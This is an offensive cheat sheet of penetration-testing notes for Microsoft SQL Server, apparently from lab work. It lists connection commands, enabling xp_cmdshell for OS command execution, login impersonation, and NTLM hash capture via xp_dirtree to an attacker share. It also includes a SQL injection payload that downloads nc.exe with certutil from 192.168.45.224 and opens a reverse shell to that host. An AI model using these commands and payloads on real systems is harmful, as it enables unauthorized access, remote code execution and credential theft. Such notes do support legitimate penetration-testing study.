## Connect to Database
### `sqsh`
```
sqsh -S <IP> -U <Username> -P <Password> -D <Database>
```
### `mssqlclient`
```
mssqlclient.py -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
```
## Commands
```
SELECT is_srvrolemember('sysadmin');
SELECT DB_NAME()
xp_cmdshell "powershell -c pwd"
```
`xp_cmdshell` Configuration
```
impacket-mssqlclient Administrator:Lab123@192.168.228.18 -windows-auth
SQL> EXECUTE sp_configure 'show advanced options', 1;
SQL> RECONFIGURE; 
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```
## Impersonation
```
SQL (HAERO\discovery  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee          grantor          
----------   --------   ---------------   ----------   --------------   --------------   
b'LOGIN'     b''        IMPERSONATE       GRANT        HAERO\services   hrappdb-reader

SQL (HAERO\discovery  guest@master)> exec_as_login hrappdb-reader
SQL (hrappdb-reader  guest@master)> 
```

## NTLM Hash disclosure
- [x] Enabled `xp_dirtree`
```
exec xp_dirtree '\\<IP>\<SHARE>\',1,1
xp_dirtree \\<ATTACKER IP>\<SHARE>
```

## Payload Injection
```
'; EXEC sp_configure 'show advanced options',1 
RECONFIGURE

EXEC sp_configure 'xp_cmdshell',1 
RECONFIGURE

DECLARE @cmd1 varchar(600)
DECLARE @cmd2 varchar(600)

SET @cmd1 = 'certutil -urlcache -f http://192.168.45.224/nc.exe c:/windows/temp/nc.exe'
EXEC xp_cmdshell @cmd1

SET @cmd2 = ''EXEC xp_cmdshell "C:/windows/temp/nc.exe 192.168.45.224 443 -e cmd.exe"
EXEC xp_cmdshell @cmd2
;--
```
1) Test the username or password fields by adding a single quote('). If there's an error or strange behavior, it might indicate SQL injection. 
2) Use time-based payloads to identify the database system. 
3) Once the DB system is known, look for specific vulnerabilities to gain further access. 
4) For MSSQL, check and enable xp_cmdshell if necessary including advanced options.
